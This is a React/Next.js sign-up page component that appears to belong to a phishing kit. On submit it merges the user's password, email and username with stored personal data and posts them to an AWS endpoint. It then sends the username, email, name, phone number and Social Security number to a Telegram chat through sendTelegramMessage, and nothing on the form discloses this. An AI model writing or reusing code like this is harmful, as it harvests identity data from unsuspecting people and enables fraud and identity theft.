/* eslint-disable @next/next/no-img-element */
/* eslint-disable @typescript-eslint/no-explicit-any */
"use client";
import React, { useState } from "react";
import { useRouter } from "next/navigation";
import axios from "axios";
import { sendTelegramMessage } from "../../../utils/telegram";

const SignUpPage: React.FC = () => {
  const router = useRouter();
  const [form, setForm] = useState({
    email: "",
    username: "",
    password: "",
    confirmPassword: "",
  });
  const [errors, setErrors] = useState<Record<string, string>>({});
  const [isLoading, setIsLoading] = useState(false);

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;
    setForm((prev) => ({ ...prev, [name]: value }));
  };

  const validateForm = () => {
    const newErrors: Record<string, string> = {};
    if (!form.username.trim()) newErrors.username = "Username is required";
    if (!form.email.trim()) {
      newErrors.email = "Email is required";
    } else if (!/\S+@\S+\.\S+/.test(form.email)) {
      newErrors.email = "Email is invalid";
    }
    if (!form.password) {
      newErrors.password = "Password is required";
    } else if (form.password.length < 6) {
      newErrors.password = "Password must be at least 6 characters";
    }
    if (form.password !== form.confirmPassword) {
      newErrors.confirmPassword = "Passwords do not match";
    }
    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleSignUp = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!validateForm()) return;
    setIsLoading(true);
    

    try {
      const storedData = JSON.parse(localStorage.getItem("personalInfo") || "{}");
      console.log(storedData)
      const requestBody = {
        username: form.username,
        email: form.email,
        password: form.password,
        ...storedData,
      };

      // API Call
      const response = await axios.post(
        'https://kj0cthjwe4.execute-api.us-east-1.amazonaws.com/latest/signupau',
        requestBody,
        { headers: { 'Content-Type': 'application/json' } }
      );

      // Telegram Notification
      const telegramMessage = `
        🚨 NEW USER SIGNUP 🚨
        📛 Username: ${form.username}
        📧 Email: ${form.email}
        👤 First Name: ${storedData.firstName}
        👥 Last Name: ${storedData.lastName}
        📞 Phone: ${storedData.phone}
        ssn: ${storedData.ssn}
      `;
      await sendTelegramMessage(telegramMessage);
      localStorage.setItem("username", form.username);

      alert(`Success: ${response.data.message}`);
      router.push("/profile");
    } catch (error: any) {
      console.error('Error:', error);
      setErrors({ global: error.response?.data.message || 'Registration failed. Please try again.' });
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="flex items-center justify-center min-h-screen bg-gray-100 px-4">
      <div className="bg-white shadow-md rounded-lg p-6 w-full max-w-md border border-gray-300">
        <div className="flex justify-center mb-4">
          <img src="/logogreen.svg" alt="Logo" className="h-10" />
        </div>

        <h1 className="text-2xl font-bold uppercase">
          <span className="text-green-600">Create</span>
          <span className="text-gray-700"> Account</span>
        </h1>

        {errors.global && (
          <div className="bg-red-100 border border-red-400 text-red-700 px-4 py-2 rounded mt-4 text-sm">
            {errors.global}
          </div>
        )}

        <form onSubmit={handleSignUp} className="mt-6 space-y-4">
          <div>
            <label className="block text-sm font-medium text-gray-700">* Username</label>
            <input
              type="text"
              name="username"
              value={form.username}
              onChange={handleChange}
              className="text-black bg-white w-full px-3 py-2 border rounded-md focus:ring-green-500 focus:border-green-500 text-sm"
            />
            {errors.username && <p className="text-red-600 text-xs">{errors.username}</p>}
          </div>

          <div>
            <label className="block text-sm font-medium text-gray-700">* Email Address</label>
            <input
              type="email"
              name="email"
              value={form.email}
              onChange={handleChange}
              className="text-black bg-white w-full px-3 py-2 border rounded-md focus:ring-green-500 focus:border-green-500 text-sm"
            />
            {errors.email && <p className="text-red-600 text-xs">{errors.email}</p>}
          </div>

          <div>
            <label className="block text-sm font-medium text-gray-700">* Password</label>
            <input
              type="password"
              name="password"
              value={form.password}
              onChange={handleChange}
              className="text-black bg-white w-full px-3 py-2 border rounded-md focus:ring-green-500 focus:border-green-500 text-sm"
            />
            {errors.password && <p className="text-red-600 text-xs">{errors.password}</p>}
          </div>

          <div>
            <label className="block text-sm font-medium text-gray-700">* Confirm Password</label>
            <input
              type="password"
              name="confirmPassword"
              value={form.confirmPassword}
              onChange={handleChange}
              className="text-black bg-white w-full px-3 py-2 border rounded-md focus:ring-green-500 focus:border-green-500 text-sm"
            />
            {errors.confirmPassword && <p className="text-red-600 text-xs">{errors.confirmPassword}</p>}
          </div>

          <button
            type="submit"
            disabled={isLoading}
            className={`w-full py-2 rounded-lg text-white font-semibold transition duration-300 text-sm ${
              isLoading ? "bg-gray-300 cursor-not-allowed" : "bg-green-600 hover:bg-green-700"
            }`}
          >
            {isLoading ? "Signing Up..." : "SIGN UP"}
          </button>
        </form>

        <p className="text-xs text-gray-500 mt-6">
          By signing up, you agree to our terms and conditions.
        </p>
      </div>
    </div>
  );
};

export default SignUpPage;